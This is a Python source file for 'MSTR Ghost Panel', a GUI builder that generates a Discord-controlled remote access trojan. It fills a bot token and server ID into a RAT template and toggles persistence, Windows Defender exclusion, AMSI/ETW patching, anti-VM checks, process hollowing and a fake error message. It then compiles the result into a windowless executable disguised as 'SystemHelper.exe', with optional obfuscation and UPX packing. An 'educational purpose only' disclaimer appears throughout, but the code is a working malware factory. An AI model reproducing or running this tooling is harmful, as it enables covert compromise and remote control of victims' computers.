#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MSTR Ghost Panel - Advanced Discord RAT Generator
Developed by zoubaire
Educational Purpose Only
"""

import os
import sys
import json
import time
import random
import string
import base64
import hashlib
import threading
import subprocess
import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
from datetime import datetime
from pathlib import Path

# Try to import customtkinter for modern UI, fallback to tkinter
USE_CTK = False
try:
    import customtkinter as ctk
    USE_CTK = True
except ImportError:
    ctk = tk

class MSTRGhostPanel:
    def __init__(self):
        self.build_id = self.generate_build_id()
        self.build_key = self.generate_build_key()
        self.build_log = []
        
        # Create main window
        if USE_CTK:
            self.root = ctk.CTk()
        else:
            self.root = tk.Tk()
        
        self.root.title("MSTR GHOST v2.0 - Stealth RAT Factory")
        self.root.geometry("1200x800")
        self.root.minsize(1000, 700)
        
        # Set icon if available
        icon_path = os.path.join(os.path.dirname(__file__), "assets", "icons", "windows_icon.ico")
        if os.path.exists(icon_path):
            try:
                self.root.iconbitmap(icon_path)
            except:
                pass
        
        # Center window
        self.center_window()
        
        # Variables
        self.bot_token = tk.StringVar()
        self.server_id = tk.StringVar()
        self.output_path = tk.StringVar(value=os.path.join(os.getcwd(), "output"))
        self.custom_icon = tk.StringVar()
        
        # Toggle variables
        self.use_encryption = tk.BooleanVar(value=True)
        self.use_persistence = tk.BooleanVar(value=True)
        self.use_defender_bypass = tk.BooleanVar(value=True)
        self.use_amsi_patch = tk.BooleanVar(value=True)
        self.use_anti_vm = tk.BooleanVar(value=True)
        self.use_process_hollow = tk.BooleanVar(value=False)
        self.use_obfuscation = tk.BooleanVar(value=False)  # Disabled by default for stability
        self.use_upx = tk.BooleanVar(value=False)
        self.use_fake_error = tk.BooleanVar(value=True)
        
        # Build UI
        self.build_ui()
        
        # Start log updater
        self.update_log_display()
        
        self.log("=" * 60)
        self.log("MSTR GHOST v2.0 Initialized")
        self.log(f"Build ID: {self.build_id}")
        self.log(f"Encryption Key: {self.build_key[:16]}...")
        self.log("=" * 60)
        self.log("Ready for RAT generation")
    
    def center_window(self):
        self.root.update_idletasks()
        w = self.root.winfo_width()
        h = self.root.winfo_height()
        x = (self.root.winfo_screenwidth() // 2) - (w // 2)
        y = (self.root.winfo_screenheight() // 2) - (h // 2)
        self.root.geometry(f'{w}x{h}+{x}+{y}')
    
    def generate_build_id(self):
        """Generate unique build ID"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        random_suffix = ''.join(random.choices(string.digits, k=4))
        return f"MSTR_{timestamp}_{random_suffix}"
    
    def generate_build_key(self):
        """Generate unique encryption key for this build"""
        seed = f"{os.getenv('COMPUTERNAME', 'unknown')}{time.time()}{random.random()}"
        return hashlib.sha256(seed.encode()).hexdigest()
    
    def build_ui(self):
        """Build the main interface"""
        # Main container
        if USE_CTK:
            main_frame = ctk.CTkFrame(self.root)
        else:
            main_frame = tk.Frame(self.root, bg="#0a0a0a")
        main_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        # Header
        self.create_header(main_frame)
        
        # Content area (split into left and right)
        content_frame = tk.Frame(main_frame, bg="#0a0a0a")
        content_frame.pack(fill=tk.BOTH, expand=True, pady=20)
        
        # Left panel - Configuration
        left_panel = tk.Frame(content_frame, bg="#0f0f0f", relief=tk.FLAT, bd=1)
        left_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 10))
        
        # Right panel - Log output
        right_panel = tk.Frame(content_frame, bg="#000000", relief=tk.SUNKEN, bd=2)
        right_panel.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(10, 0))
        
        # Build left panel content
        self.create_config_section(left_panel)
        self.create_evasion_section(left_panel)
        self.create_build_section(left_panel)
        
        # Build right panel content
        self.create_log_section(right_panel)
        
        # Footer
        self.create_footer(main_frame)
    
    def create_header(self, parent):
        """Create header with title and ASCII art"""
        header_frame = tk.Frame(parent, bg="#0a0a0a")
        header_frame.pack(fill=tk.X)
        
        # ASCII Art
        ascii_art = """
╔═══════════════════════════════════════════════════════════╗
║  ███╗   ███╗███████╗████████╗██████╗     ██████╗  █████╗ ████████╗
║  ████╗ ████║██╔════╝╚══██╔══╝██╔══██╗    ██╔══██╗██╔══██╗╚══██╔══╝
║  ██╔████╔██║███████╗   ██║   ██████╔╝    ██████╔╝███████║   ██║   
║  ██║╚██╔╝██║╚════██║   ██║   ██╔══██╗    ██╔══██╗██╔══██║   ██║   
║  ██║ ╚═╝ ██║███████║   ██║   ██║  ██║    ██║  ██║██║  ██║   ██║   
║  ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
║                          GHOST EDITION v2.0                         ║
╚══════════════════════════════════════════════════════════════════════╝
        """
        
        label = tk.Label(header_frame, text=ascii_art, font=("Courier New", 8), 
                         fg="#00ffcc", bg="#0a0a0a", justify=tk.LEFT)
        label.pack()
        
        # Subtitle
        subtitle = tk.Label(header_frame, text="Developed by zoubaire | Educational Purpose Only | Stealth RAT Generator",
                           font=("Courier New", 9), fg="#888888", bg="#0a0a0a")
        subtitle.pack(pady=(0, 10))
    
    def create_config_section(self, parent):
        """Create configuration section"""
        section_frame = tk.LabelFrame(parent, text="[ DISCORD CONFIGURATION ]", 
                                      font=("Courier New", 12, "bold"),
                                      fg="#00ffcc", bg="#0f0f0f", bd=2, relief=tk.GROOVE)
        section_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # Bot Token
        tk.Label(section_frame, text="Bot Token:", font=("Courier New", 10),
                fg="#00ffcc", bg="#0f0f0f").grid(row=0, column=0, sticky=tk.W, padx=10, pady=10)
        
        token_entry = tk.Entry(section_frame, textvariable=self.bot_token, width=50,
                               font=("Courier New", 10), bg="#1a1a1a", fg="#00ffcc",
                               insertbackground="#00ffcc", relief=tk.FLAT, bd=1)
        token_entry.grid(row=0, column=1, padx=10, pady=10, sticky=tk.W)
        
        # Server ID
        tk.Label(section_frame, text="Server ID:", font=("Courier New", 10),
                fg="#00ffcc", bg="#0f0f0f").grid(row=1, column=0, sticky=tk.W, padx=10, pady=10)
        
        server_entry = tk.Entry(section_frame, textvariable=self.server_id, width=50,
                                font=("Courier New", 10), bg="#1a1a1a", fg="#00ffcc",
                                insertbackground="#00ffcc", relief=tk.FLAT, bd=1)
        server_entry.grid(row=1, column=1, padx=10, pady=10, sticky=tk.W)
        
        # Output Folder
        tk.Label(section_frame, text="Output Folder:", font=("Courier New", 10),
                fg="#00ffcc", bg="#0f0f0f").grid(row=2, column=0, sticky=tk.W, padx=10, pady=10)
        
        output_frame = tk.Frame(section_frame, bg="#0f0f0f")
        output_frame.grid(row=2, column=1, sticky=tk.W, padx=10, pady=10)
        
        output_entry = tk.Entry(output_frame, textvariable=self.output_path, width=40,
                                font=("Courier New", 10), bg="#1a1a1a", fg="#00ffcc", relief=tk.FLAT)
        output_entry.pack(side=tk.LEFT)
        
        tk.Button(output_frame, text="Browse", command=self.browse_output,
                 bg="#333333", fg="#00ffcc", font=("Courier New", 9), relief=tk.FLAT).pack(side=tk.LEFT, padx=(5,0))
        
        # Custom Icon
        tk.Label(section_frame, text="Custom Icon (.ico):", font=("Courier New", 10),
                fg="#00ffcc", bg="#0f0f0f").grid(row=3, column=0, sticky=tk.W, padx=10, pady=10)
        
        icon_frame = tk.Frame(section_frame, bg="#0f0f0f")
        icon_frame.grid(row=3, column=1, sticky=tk.W, padx=10, pady=10)
        
        icon_entry = tk.Entry(icon_frame, textvariable=self.custom_icon, width=40,
                             font=("Courier New", 10), bg="#1a1a1a", fg="#00ffcc", relief=tk.FLAT)
        icon_entry.pack(side=tk.LEFT)
        
        tk.Button(icon_frame, text="Select", command=self.browse_icon,
                 bg="#333333", fg="#00ffcc", font=("Courier New", 9), relief=tk.FLAT).pack(side=tk.LEFT, padx=(5,0))
    
    def create_evasion_section(self, parent):
        """Create evasion options section"""
        section_frame = tk.LabelFrame(parent, text="[ GHOST EVASION OPTIONS ]", 
                                      font=("Courier New", 12, "bold"),
                                      fg="#ff00cc", bg="#0f0f0f", bd=2, relief=tk.GROOVE)
        section_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # Create two columns for checkboxes
        left_col = tk.Frame(section_frame, bg="#0f0f0f")
        left_col.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        right_col = tk.Frame(section_frame, bg="#0f0f0f")
        right_col.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Left column checkboxes
        self.create_checkbox(left_col, "Payload Encryption (AES-256)", self.use_encryption, 0)
        self.create_checkbox(left_col, "Persistence Installation", self.use_persistence, 1)
        self.create_checkbox(left_col, "Defender Auto-Exclusion", self.use_defender_bypass, 2)
        self.create_checkbox(left_col, "AMSI/ETW Patching", self.use_amsi_patch, 3)
        
        # Right column checkboxes
        self.create_checkbox(right_col, "Anti-VM/Anti-Sandbox", self.use_anti_vm, 0)
        self.create_checkbox(right_col, "Process Hollowing (Admin)", self.use_process_hollow, 1)
        self.create_checkbox(right_col, "Code Obfuscation (Experimental)", self.use_obfuscation, 2)
        self.create_checkbox(right_col, "Fake Error Message", self.use_fake_error, 3)
        self.create_checkbox(right_col, "UPX Compression", self.use_upx, 4)
    
    def create_checkbox(self, parent, text, variable, row):
        """Create styled checkbox"""
        cb = tk.Checkbutton(parent, text=text, variable=variable,
                           bg="#0f0f0f", fg="#00ffcc", selectcolor="#0f0f0f",
                           font=("Courier New", 9), anchor=tk.W)
        cb.grid(row=row, column=0, sticky=tk.W, pady=5)
    
    def create_build_section(self, parent):
        """Create build button section"""
        section_frame = tk.Frame(parent, bg="#0f0f0f")
        section_frame.pack(fill=tk.X, padx=10, pady=20)
        
        # Progress bar
        self.progress_bar = ttk.Progressbar(section_frame, orient="horizontal", 
                                            length=400, mode="indeterminate")
        self.progress_bar.pack(pady=10)
        
        # Build button
        self.build_button = tk.Button(section_frame, text="🔥 GENERATE GHOST RAT 🔥",
                                     command=self.start_generation,
                                     bg="#00ffcc", fg="#000000",
                                     font=("Courier New", 14, "bold"),
                                     relief=tk.RAISED, padx=30, pady=10)
        self.build_button.pack(pady=10)
        
        # Status label
        self.status_label = tk.Label(section_frame, text="Ready", 
                                     font=("Courier New", 10),
                                     fg="#888888", bg="#0f0f0f")
        self.status_label.pack()
    
    def create_log_section(self, parent):
        """Create log output section"""
        log_frame = tk.Frame(parent, bg="#000000")
        log_frame.pack(fill=tk.BOTH, expand=True)
        
        # Header
        tk.Label(log_frame, text="[ BUILD LOG ]", font=("Courier New", 12, "bold"),
                fg="#00ffcc", bg="#000000").pack(anchor=tk.W, padx=5, pady=5)
        
        # Log text area
        self.log_text = scrolledtext.ScrolledText(log_frame, bg="#000000", fg="#00ffcc",
                                                   font=("Courier New", 9),
                                                   wrap=tk.WORD, height=30)
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Configure tags for colors
        self.log_text.tag_config("INFO", foreground="#00ffcc")
        self.log_text.tag_config("WARN", foreground="#ffcc00")
        self.log_text.tag_config("ERROR", foreground="#ff3366")
        self.log_text.tag_config("SUCCESS", foreground="#33ff66")
    
    def create_footer(self, parent):
        """Create footer with links"""
        footer = tk.Frame(parent, bg="#0a0a0a")
        footer.pack(fill=tk.X, pady=(10, 0))
        
        # Disclaimer
        disclaimer = tk.Label(footer, 
                             text="⚠️ EDUCATIONAL PURPOSE ONLY - Unauthorized use is illegal ⚠️",
                             font=("Courier New", 8), fg="#ff3366", bg="#0a0a0a")
        disclaimer.pack()
    
    def browse_output(self):
        folder = filedialog.askdirectory()
        if folder:
            self.output_path.set(folder)
    
    def browse_icon(self):
        file = filedialog.askopenfilename(filetypes=[("Icon files", "*.ico")])
        if file:
            self.custom_icon.set(file)
    
    def log(self, message, level="INFO"):
        """Add message to log"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        # Update text widget
        self.log_text.insert(tk.END, f"[{timestamp}] ", level)
        self.log_text.insert(tk.END, f"{message}\n", level)
        self.log_text.see(tk.END)
        self.root.update_idletasks()
    
    def update_log_display(self):
        """Update log display periodically"""
        self.log_text.see(tk.END)
        self.root.after(100, self.update_log_display)
    
    def start_generation(self):
        """Start RAT generation in separate thread"""
        if not self.bot_token.get() or not self.server_id.get():
            messagebox.showerror("Error", "Bot Token and Server ID are required!")
            return
        
        # Disable button during build
        self.build_button.config(state=tk.DISABLED)
        self.status_label.config(text="Building...", fg="#ffcc00")
        self.progress_bar.start()
        
        # Start generation thread
        thread = threading.Thread(target=self.generate_rat)
        thread.daemon = True
        thread.start()
    
    def generate_rat(self):
        """Main RAT generation logic"""
        error_message = None
        
        try:
            self.log("=" * 50)
            self.log("Starting GHOST RAT generation process")
            self.log(f"Build ID: {self.build_id}")
            self.log("-" * 50)
            
            # Create output directory
            output_dir = self.output_path.get()
            os.makedirs(output_dir, exist_ok=True)
            
            # Step 1: Read template
            self.log("[1/7] Reading RAT template...")
            template_path = os.path.join(os.path.dirname(__file__), "generator", "MSTR_GHOST_Core.py")
            
            if not os.path.exists(template_path):
                raise Exception(f"Template not found: {template_path}")
            
            with open(template_path, "r", encoding="utf-8") as f:
                core_code = f.read()
            
            # Step 2: Encrypt credentials
            self.log("[2/7] Encrypting credentials...")
            if self.use_encryption.get():
                try:
                    from generator.cryptor import PayloadCryptor
                    cryptor = PayloadCryptor(self.build_key)
                    encrypted_data = cryptor.encrypt_payload(self.bot_token.get(), self.server_id.get())
                    core_code = core_code.replace("{ENCRYPTED_PAYLOAD}", encrypted_data)
                    self.log("Credentials encrypted successfully")
                except Exception as crypt_err:
                    self.log(f"Encryption failed: {str(crypt_err)}, using plaintext", "WARN")
                    core_code = core_code.replace("{ENCRYPTED_PAYLOAD}", "")
                    core_code = core_code.replace("{bot_token}", self.bot_token.get())
                    core_code = core_code.replace("{server_id}", self.server_id.get())
            else:
                core_code = core_code.replace("{ENCRYPTED_PAYLOAD}", "")
                core_code = core_code.replace("{bot_token}", self.bot_token.get())
                core_code = core_code.replace("{server_id}", self.server_id.get())
            
            # Step 3: Add evasion features
            self.log("[3/7] Injecting evasion modules...")
            
            evasion_flags = {
                "PERSISTENCE": str(self.use_persistence.get()),
                "DEFENDER_BYPASS": str(self.use_defender_bypass.get()),
                "AMSI_PATCH": str(self.use_amsi_patch.get()),
                "ANTI_VM": str(self.use_anti_vm.get()),
                "PROCESS_HOLLOW": str(self.use_process_hollow.get()),
                "FAKE_ERROR": str(self.use_fake_error.get()),
            }
            
            evasion_config = f"""
# EVASION CONFIGURATION - AUTO GENERATED
ENABLE_PERSISTENCE = {evasion_flags['PERSISTENCE']}
ENABLE_DEFENDER_BYPASS = {evasion_flags['DEFENDER_BYPASS']}
ENABLE_AMSI_PATCH = {evasion_flags['AMSI_PATCH']}
ENABLE_ANTI_VM = {evasion_flags['ANTI_VM']}
ENABLE_PROCESS_HOLLOW = {evasion_flags['PROCESS_HOLLOW']}
ENABLE_FAKE_ERROR = {evasion_flags['FAKE_ERROR']}
"""
            core_code = core_code.replace("# EVASION_CONFIG_PLACEHOLDER", evasion_config)
            
            # Step 4: Obfuscate code (optional)
            self.log("[4/7] Processing code...")
            if self.use_obfuscation.get():
                try:
                    from generator.obfuscator import obfuscate_python
                    self.log("Applying obfuscation (this may take a moment)...")
                    core_code = obfuscate_python(core_code)
                    self.log("Code obfuscation completed")
                except Exception as obf_err:
                    self.log(f"Obfuscation failed: {str(obf_err)} - using unobfuscated code", "WARN")
            
            # Step 5: Save working file
            self.log("[5/7] Saving working copy...")
            working_py = os.path.join(output_dir, f"{self.build_id}.py")
            with open(working_py, "w", encoding="utf-8") as f:
                f.write(core_code)
            self.log(f"Working file saved: {working_py}")
            
            # Step 6: Compile to EXE
            self.log("[6/7] Compiling to executable...")
            exe_path = self.compile_to_exe(working_py, output_dir)
            
            if not exe_path:
                raise Exception("Compilation failed - check PyInstaller installation")
            
            # Step 7: Optional UPX compression
            self.log("[7/7] Finalizing...")
            if self.use_upx.get():
                self.compress_with_upx(exe_path)
            
            # Success
            self.log("-" * 50)
            self.log("✅ GHOST RAT GENERATED SUCCESSFULLY! ✅", "SUCCESS")
            self.log(f"Location: {exe_path}", "SUCCESS")
            self.log(f"Size: {os.path.getsize(exe_path):,} bytes", "SUCCESS")
            self.log("-" * 50)
            
            # Store success info for lambda
            success_path = exe_path
            success_size = os.path.getsize(exe_path)
            success_features = {
                "encryption": self.use_encryption.get(),
                "persistence": self.use_persistence.get(),
                "defender": self.use_defender_bypass.get(),
                "amsi": self.use_amsi_patch.get(),
                "antivm": self.use_anti_vm.get(),
                "obfuscation": self.use_obfuscation.get(),
            }
            
            def show_success():
                messagebox.showinfo(
                    "Success", 
                    f"Ghost RAT generated successfully!\n\n"
                    f"Location: {success_path}\n"
                    f"Size: {success_size:,} bytes\n\n"
                    f"Features enabled:\n"
                    f"- Encryption: {success_features['encryption']}\n"
                    f"- Persistence: {success_features['persistence']}\n"
                    f"- Defender Bypass: {success_features['defender']}\n"
                    f"- AMSI Patch: {success_features['amsi']}\n"
                    f"- Anti-VM: {success_features['antivm']}\n"
                    f"- Code Obfuscation: {success_features['obfuscation']}\n\n"
                    f"⚠️ Use responsibly and legally!"
                )
            self.root.after(0, show_success)
            
        except Exception as gen_error:
            error_message = str(gen_error)
            self.log(f"Generation failed: {error_message}", "ERROR")
            
            # Capture error message for lambda
            err_msg = error_message
            def show_error():
                messagebox.showerror("Error", f"Generation failed:\n{err_msg}")
            self.root.after(0, show_error)
        
        finally:
            self.root.after(0, self.reset_ui)
    
    def compile_to_exe(self, py_file, output_dir):
        """Compile Python to EXE using PyInstaller"""
        try:
            # Find PyInstaller
            pyinstaller_path = self.find_pyinstaller()
            if not pyinstaller_path:
                self.log("PyInstaller not found! Install with: pip install pyinstaller", "ERROR")
                return None
            
            self.log(f"Using PyInstaller: {pyinstaller_path}")
            
            # Build command
            exe_name = "SystemHelper"
            cmd = [
                pyinstaller_path,
                "--onefile",
                "--noconsole",
                "--noconfirm",
                "--distpath", output_dir,
                "--workpath", os.path.join(output_dir, "build"),
                "--specpath", output_dir,
                "--name", exe_name,
                "--strip",
                py_file
            ]
            
            # Add icon if specified
            if self.custom_icon.get() and os.path.exists(self.custom_icon.get()):
                cmd.extend(["--icon", self.custom_icon.get()])
                self.log(f"Using custom icon: {self.custom_icon.get()}")
            else:
                default_icon = os.path.join(os.path.dirname(__file__), "assets", "icons", "windows_icon.ico")
                if os.path.exists(default_icon):
                    cmd.extend(["--icon", default_icon])
            
            # Execute
            self.log("Running PyInstaller (this may take 30-60 seconds)...")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
            
            if result.returncode == 0:
                exe_path = os.path.join(output_dir, f"{exe_name}.exe")
                if os.path.exists(exe_path):
                    self.log("Compilation successful!", "SUCCESS")
                    return exe_path
                else:
                    self.log(f"EXE not found at expected path: {exe_path}", "ERROR")
                    return None
            else:
                error_output = result.stderr[:500] if result.stderr else "Unknown error"
                self.log(f"PyInstaller error: {error_output}", "ERROR")
                return None
                
        except subprocess.TimeoutExpired:
            self.log("Compilation timeout after 180 seconds", "ERROR")
            return None
        except Exception as e:
            self.log(f"Compilation error: {str(e)}", "ERROR")
            return None
    
    def find_pyinstaller(self):
        """Locate PyInstaller executable"""
        import shutil
        
        # Check if pyinstaller is in PATH
        pyinstaller = shutil.which("pyinstaller")
        if pyinstaller:
            return pyinstaller
        
        # Common installation paths for Python 3.13
        python_paths = [
            os.path.expanduser("~\\AppData\\Local\\Programs\\Python\\Python313\\Scripts\\pyinstaller.exe"),
            os.path.expanduser("~\\AppData\\Local\\Programs\\Python\\Python312\\Scripts\\pyinstaller.exe"),
            os.path.expanduser("~\\AppData\\Local\\Programs\\Python\\Python311\\Scripts\\pyinstaller.exe"),
            os.path.expanduser("~\\AppData\\Local\\Programs\\Python\\Python310\\Scripts\\pyinstaller.exe"),
            os.path.expanduser("~\\AppData\\Roaming\\Python\\Python313\\Scripts\\pyinstaller.exe"),
            os.path.expanduser("~\\AppData\\Roaming\\Python\\Python312\\Scripts\\pyinstaller.exe"),
            "C:\\Python313\\Scripts\\pyinstaller.exe",
            "C:\\Python312\\Scripts\\pyinstaller.exe",
            "C:\\Python311\\Scripts\\pyinstaller.exe",
        ]
        
        for path in python_paths:
            if os.path.exists(path):
                return path
        
        return None
    
    def compress_with_upx(self, exe_path):
        """Compress EXE with UPX"""
        upx_path = os.path.join(os.path.dirname(__file__), "tools", "upx.exe")
        if os.path.exists(upx_path):
            try:
                self.log("Applying UPX compression...")
                result = subprocess.run([upx_path, "--best", "--compress-icons=0", exe_path], 
                                       capture_output=True, timeout=60)
                if result.returncode == 0:
                    self.log("UPX compression applied successfully", "SUCCESS")
                else:
                    self.log("UPX compression failed", "WARN")
            except Exception as e:
                self.log(f"UPX compression failed: {str(e)}", "WARN")
        else:
            self.log("UPX not found, skipping compression", "WARN")
    
    def reset_ui(self):
        """Reset UI after build"""
        self.build_button.config(state=tk.NORMAL)
        self.status_label.config(text="Ready", fg="#888888")
        self.progress_bar.stop()
    
    def run(self):
        """Start the application"""
        self.root.mainloop()


if __name__ == "__main__":
    app = MSTRGhostPanel()
    app.run()